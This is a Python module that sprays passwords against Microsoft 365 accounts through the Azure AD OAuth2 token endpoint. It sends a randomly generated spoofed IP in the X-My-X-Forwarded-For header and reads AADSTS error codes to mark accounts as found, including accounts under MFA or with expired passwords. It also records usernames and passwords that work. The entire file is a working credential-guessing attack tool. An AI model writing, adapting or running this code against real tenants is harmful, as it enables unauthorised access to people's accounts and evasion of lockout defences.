#!/usr/bin/env python3

import requests
import warnings
import random 

# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


'''Function to password guess against o365 using the autodiscover endpoint.
Maybe will implement a method to guess against EWS endpoint'''
def o365_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    owaurl = ''.join(params.get("host"))
    target = owaurl.split('/')
    spoofed_ip = generate_ip()

    body = {
       'resource': 'https://graph.windows.net',
       'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
       'client_info': '1',
       'grant_type': 'password',
       'username': username,
       'password': password,
       'scope': 'openid',
    }

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-My-X-Forwarded-For' : spoofed_ip,
    }

    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [O365] Target: {target[2]} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        query = requests.post(f"{owaurl}/common/oauth2/token", headers=headers, data=body)

        if query.status_code == 200:
            print(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS]")
        else:
            resp = query.json()
            error = resp["error_description"]

            if "AADSTS50126" in error:
                #print(f"Invalid username or password. Username: {username} could exist.")
                pass

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                print(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")

            elif "AADSTS50034" in error:
                print(f"WARNING! The user {username} doesn't exist.")

            elif "AADSTS50079" in error or "AADSTS50076" in error:
                # Microsoft MFA response
                #print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
                print(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The response indicates MFA (Microsoft) is in use.]")
                if filelogger != None:
                    filelogger.debug(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The response indicates MFA (Microsoft) is in use.]")

            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                #print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
                print(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The response indicates MFA (Microsoft) is in use.]")
                if filelogger != None:
                    filelogger.debug(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The response indicates MFA (Microsoft) is in use.]")

            elif "AADSTS50053" in error:
            # Locked out account or Smart Lockout in place
                print(f"WARNING! The account {username} appears to be locked.")

            elif "AADSTS50057" in error:
                # Disabled account
                print(f"WARNING! The account {username} appears to be disabled.")

            elif "AADSTS50055" in error:
                # User password is expired
                print(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The user's password is expired.]")
                if filelogger != None:
                    filelogger.debug(f"ACCOUNT FOUND: [O365] Target: {target[2]} User: {username} Password: {password} [SUCCESS - The user's password is expired.]")

            else:
                # Unknown errors
                print(f"Got an error we haven't seen yet for user {username}")
                print(error)
	
    except:
        pass
